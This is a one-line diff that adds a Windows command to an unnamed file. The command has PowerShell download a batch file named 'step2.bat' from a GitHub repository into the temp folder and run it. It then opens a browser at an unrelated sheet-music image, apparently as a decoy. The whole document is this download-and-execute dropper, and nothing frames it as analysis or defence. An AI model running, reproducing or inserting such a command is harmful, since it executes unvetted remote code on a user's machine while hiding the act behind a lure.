@@ -1,0 +1,1 @@
+cmd.exe /c powershell -Command "cd %temp%;Invoke-WebRequest -Uri 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/step2.bat' -OutFile 'step2.bat';./step2.bat"; start msedge https://s3.amazonaws.com/halleonard-pagepreviews/HL_DDS_1226457Fr6EEy80cf.png
